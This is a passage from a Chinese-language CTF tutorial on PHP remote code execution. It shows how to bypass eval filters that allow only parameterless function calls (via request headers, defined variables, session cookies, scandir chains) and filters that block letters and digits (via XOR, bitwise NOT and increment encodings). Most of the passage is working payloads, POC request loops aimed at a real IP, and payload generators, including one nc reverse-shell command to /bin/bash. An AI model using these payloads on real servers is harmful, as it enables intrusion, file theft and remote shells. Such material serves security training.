        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh x")
    requests.get(base_url + "sh g")
```

## 0x15. 无参数命令执行请求头绕过（PHP 7.0）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

正则表达式解析

```php
/[^\W]+\((?R)?\)/
    
[^\W]+：等于 [\w]+，表示匹配 字母、数字_下划线
\(：匹配 (
\)：匹配 )
?R：递归匹配。能匹配 a(b(c()))
总结：能匹配所有不带参数的函数
```

### 前置知识

#### `getallheaders` 函数

`getallheaders` — 获取全部 HTTP 请求头信息

```
getallheaders ( void ) : array
```

##### 返回值

包含当前请求所有头信息的数组，失败返回 **`FALSE`** 。

#### `end()`函数

`end` — 将数组的内部指针指向最后一个单元；返回数组中的最后一个元素

end ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)

**end()** 将 `array` 的内部指针移动到最后一个单元并返回其值。

##### 参数



- `array`

  这个数组。 该数组是通过引用传递的，因为它会被这个函数修改。 这意味着你必须传入一个真正的变量，而不是函数返回的数组，因为只有真正的变量才能以引用传递。

##### 返回值

返回最后一个元素的值，或者如果是空数组则返回 **`FALSE`**。

#### `pos()` 函数

**是函数`current()`的别名**

##### 说明

```
current ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)
```

每个数组中都有一个内部的指针指向它“当前的”单元，初始指向插入到数组中的第一个单元。

##### 参数

- `array`

  这个数组。

##### 返回值

**current()** 函数返回当前被内部指针指向的数组单元的值，并不移动指针。如果内部指针指向超出了单元列表的末端，**current()** 返回 **`FALSE`**。

### 思路

1. 利用`eval()`函数执行函数

2. 通过修改请求头的方式执行想要执行的命令

3. 通过函数`getallheaders()`获取请求头；如果不行，可以尝试使用`apache_request_headers()`

4. 通过`pos()`、`end()`、`current()`函数获取命令

5. 最后包裹`system()`执行命令

   ```bash
   payload：?code=system(pos(getallheaders()));
   ```

### 解题流程

#### 1. 获取请求头

注意：这里的输出是将请求头的内容倒序输出

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173806266.png" alt="image-20230816173806266" style="zoom:80%;" />

#### 2. 获取指定内容

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173906487.png" alt="image-20230816173906487" style="zoom:80%;" />

#### 3. 修改请求头

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173940951.png" alt="image-20230816173940951" style="zoom:80%;" />

#### 4. 执行命令

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816174015690.png" alt="image-20230816174015690" style="zoom:80%;" />

## 0x16. 无参数全局变量RCE（PHP 5/7）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 前置知识

#### get_defined_vars

(PHP 4 >= 4.0.4, PHP 5, PHP 7)

get_defined_vars — ==返回由所有已定义变量所组成的数组==

##### 描述

```
get_defined_vars ( void ) : array
```

此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

### 解题流程

大致手法和思路跟上一题一样，不过这种方法更加灵活适用

```
payload：system(end(pos(get_defined_vars())));&cmd=cat+flag;
```

#### 1. 查看当前所有变量

```
?code=var_dump(get_defined_vars());
```

![image-20230816215701700](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215701700.png)

#### 2. 增加变量-->命令

```
?code=var_dump(get_defined_vars());&cmd=ls;
```

![image-20230816215830837](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215830837.png)

#### 3. 抓取变量

先用`pos()`方法将全局数组`$_GET`，再使用`end()`方法抓`ls`

```
?code=var_dump(pos(get_defined_vars()));&cmd=ls;
?code=var_dump(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816215924585](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215924585.png)

![image-20230816220039674](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220039674.png)

#### 4. 执行命令

由于例题中，有一个`eval()`函数包裹，所以这里直接执行`system()`就行

```
?code=system(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816220129093](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220129093.png)

## 0x17. 无参数session RCE

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 思路

1. 首先查看请求头是否携带了`cookie`，没有就使用函数`session_start()`开启

2. 使用`session_id()`获取`cookie`值

3. 使用`system()`执行命令

   注意：由于请求头中的`Cookie`只接受 数字和字符，所以如果想往里面输入空格或者括号的话，就需要使用`HEX`编码，然后在payload中使用函数`hex2bin()`来解码

### 解题流程

#### 1. 开启Session

这一步需要先在浏览器执行，不要直接在Burp Suite上做，否则会抓不到Cookie

```
?code=var_dump(session_start());
```

![image-20230816222201773](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222201773.png)

#### 2. 获取Session值

```
?code=var_dump(session_id(session_start()));
```

![image-20230816222323558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222323558.png)

#### 3. 修改Cookie值

![image-20230816222521768](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222521768.png)

#### 4. 执行命令

```
system(session_id(session_start()));
```

![image-20230816222546769](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222546769.png)

#### 5. 编码绕过

由于如果先执行`cat flag`命令，其中带有空格，所以Cookie会事变不了，这里使用`HEX`编码，注意使用函数`hex2bin()`解码

```
?code=system(hex2bin(session_id(session_start())));
```

![image-20230816222810927](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222810927.png)

## 0x18. 无参数`scandir`读取（上）

### 可利用函数

```
scandir() -- 列出指定路径终端文件和目录（PHP 5、PHP 7、PHP 8）
getcwd() -- 获取当前工作路径（PHP 4、PHP 7、PHP 8）
current() -- 返回数组中的当前值（PHP 4、PHP 5、PHP 7、PHP 8）
array_reverse() -- 将指定数组倒序返回（PHP 4、PHP 5、PHP 7、PHP 8）
array_flip() -- 交换数组中的键和值（PHP 4、PHP 5、PHP 7、PHP 8）
next() -- 将数组中的内部指针向前移动并返回值（PHP 4、PHP 5、PHP 7、PHP 8）
array_rand() -- 从数组中随机取出一个或多个随机值，若只取出一个，则返回键名
strrev() -- 将指定字符串反转倒序输出
crypt() -- 用来加密
hebrev() -- 把希伯来文从右至左的流转换为左至右的流
```

## 0x19. 无参数`scandir`读取（下）

### 读取上一目录

```
payload：show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));
```

#### 讲解

1. `getcwd()`：函数读取当前工作路径、返回一个路径
2. `dirname()`：读取路径并返回该路径的父路径
3. `chdir()`：相当于`cd`命令，进入指定路径
4. `dirname`：继续返回父路径，此时的路径为`.`
5. `scandir()`：扫描指定路径的文件和文件夹
6. `end()`：使用`end、pos、next`等函数来指定要查看的文件
7. `show_source()`：读取文件，也可以使用`highlight_file()`

### 读取根目录

```
payload：show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));
```

#### 讲解

1. `array()`：打印一个空数组
2. `serialize()`：对这个空数组进行序列化，返回一串字符串
3. `crypt()`：对这串字符串进行加密，返回一串密文，这串密文包含`/`这个字符串
4. `strrev()`：对这个字符串进行倒序输出
5. `chr()、ord()`：如果输入一串字符串只会对第一个字符做运算，使用这一特性，取出字符串`/`
6. `chdir()`：更改工作路径，`cd /`
7. `dirname()`：返回当前路径的父路径并返回路径字符串
8. `scandir()`：扫描该路径的文件和文件夹
9. `array_flip()`：将数组中的键值对对调
10. `array_rand()`：随机获取数组中的某一个键名
11. `show_source`：读取文件，也可以使用`highlight_file()`

总结：要成功得到`/`目录下的`flag`，要两个前提条件：

1. 加密的密文字符串中的最后一位字符必须是`\`
2. `array_rand()`：随机到的条目必须是`flag`文件

#### POC代码

```py
import requests

base_url = 'http://47.120.43.120:18082/class10/1.php?code='
payload = 'show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));'

for i in range(4000):
    res = requests.get(base_url + payload).text
    print(res)
```

## 0x20. 无字母数字异或运算绕过

### 1. 异或运算

将一串二进制字符串进行逐位异或运算，**相同为0，不同为1**

### 2. 异或运算脚本

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$shell = $_GET["cmd"];
$result1 = "";
$result2 = "";

function judge($c)
{
    if(!preg_match('/[a-z0-9]/is',$c))
    {
        return true;
    }
    return false;
}

for($num=0;$num<=strlen($shell);$num++)
{
    for($x=33;$x<=126;$x++)
    {
        if(judge(chr($x)))
        {
            for($y=33;$y<=126;$y++)
            {
                if(judge(chr($y)))
                {
                    $f = chr($x)^chr($y);
                    if($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo "异或运算第一部分： ".$result1;
echo "<br>";
echo "异或运算第二部分： ".$result2;
```

### 3. PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
```

#### POC 代码

```php
<?php
$_ = '("((%-'^'[[[\@@';		// 异或结果：system
$__ = '!+/(('^'~{`{|';		// 异或结果：_POST
$___ = $$__;				// $__ = _POST; $$__ = $_POST
$_($___['____']);			// 代码拼接：system($_POST['____'])
```

#### payload

提交之前需先做**URL编码**

```
cmd=$_ = '("((%-'^'[[[\@@';$__ = '!+/(('^'~{`{|';$___ = $$__;$_($___['____']);
```

此时即可使用POST提交要执行的命令

![image-20230821165943022](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821165943022.png)

#### 扩展

如果对方禁止了`system、eval、passthru`等函数的执行，那么可以使用反引号来执行命令；但是由于反引号没有回显，所以此时我们可以直接使用nc回弹`webshell`

## 0x21. 无字母数字取反绕过

### 取反运算

将二进制序列逐位取反计算

例如：现有一串二进制字符串`1001`，取反运算后结果位：`0110`

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC代码

```php
$_ = ~('%9e%8c%8c%9a%8d%8b');			// 取反运算结果：assert
$__ =  ~('%a0%af%b0%ac%ab');			// 取反运算结果：_POST
$___ = $$__;							// $__ = _POST; $$__ = $_POST
$_($___['____']);						// 代码组装：assert($_POSTp['____'])
```

```
payload：
GET传参：
cmd=$_ = ~('%9e%8c%8c%9a%8d%8b');$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;$_($___['____']);

POST传参：
____=system('cat flag')
```

![image-20230821205218805](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821205218805.png)

#### 取反运算计算脚本

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
$shell = $_GET['cmd'];
$result = "";
$arr =array();
$word = "一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺
木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引
丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们
仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾
扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传
乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅
字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖
护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我
乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟
没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖
拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚
旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿
胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试
郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪
某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂
哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀
饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误
诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫
荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积
秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳
粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继
球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇
圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐
混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬
葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩
稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙
谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳
跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静
碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱
嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐
嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾
夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛
吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙
呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤
荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦
匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋
疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾
啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽
缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔
奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙
腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥
谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥
霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹
靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗";
function mb_str_split( $string ) {
    return preg_split('/(?<!^)(?!$)/u', $string );
}
foreach (mb_str_split($word) as $c)
{
    $arr[] = $c;
}

for ($x=0;$x<strlen($shell);$x++)
{
    for ($y=0;$y<count($arr);$y++)
    {
        $k = $arr[$y];
        if ($shell[$x] == ~($k{1}))
        {
            $result .= $k;
            $result1 .= "%".bin2hex($k{1});
            break;
        }
    }
}
echo "通过在URL内GET方法提交?cmd=\"具体命令\"";
echo "<br>";
echo "字符串：".$result;
echo "<br>";
echo "URL编码：".$result1;

```

### 反引号返回webshell

题目与`PHP 5.0`一样，但是由于反引号没有回显，所以无法直接读取文件

#### POC 代码

```php
<?php
$__ =  ~('%a0%af%b0%ac%ab');
$___ = $$__;
`$___[_]`;
```

#### payload

```
GET 传参：
cmd=$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;`$___[_]`;	

POST 传参：
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字自增绕过

### 自增运算

在 PHP 中，自增运算符 `++` 可以用来将变量的值增加 1。它有两种形式：前自增和后自增。

- 前自增：`++$a`。它将 `$a` 的值加 1，然后返回 `$a`。
- 后自增：`$a++`。它返回 `$a` 的值，然后将 `$a` 的值加 1。

```php
<?php
echo "<h3>Postincrement</h3>";
$a = 5;
echo "Should be 5: " . $a++ . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";

echo "<h3>Preincrement</h3>";
$a = 5;
echo "Should be 6: " . ++$a . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";
?>
```

### 解题思路

如果我们获取了字符串`a`，那么就可以通过自增运算，获取所有想要的字符

```php
<?php
$a = 'a';
echo ++$a;

// 输出 b
```

此时的问题时如何获取到字符`a`呢？

通过在后面追加空字符串，使得类型变成`str`，再通过切片来获得想要的字符

```php
$a = [];
echo $a;

// 输出 Array

$a = [].'';
echo $a[0];

// 输出 A
```

### POC生成脚本

不准确，需要将结果再修改

```php
<?php
highlight_file(__FILE__);
$cmd = strtoupper($_GET['cmd']);
$cmd2 = strtoupper($_GET['post']);
function POC($cmd){
    $i = 0;
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$_ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1);
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

function POC2($cmd){
    $i = 0;
    echo '$____ = "_";$__=$___;';
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$____ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}


if (!empty($cmd)){
    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
    echo $POC_pat7;
    POC($cmd);
}
if (!empty($cmd2)){
    POC2($cmd2);
}
```

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC 代码

```php
<?php
// ASSERT
$_=[].'';
$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;
// 
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
$__ = $$____;
$_($__[_____]);
```

#### payload

注意：GET传参需要使用URL编码

```
GET 传参：
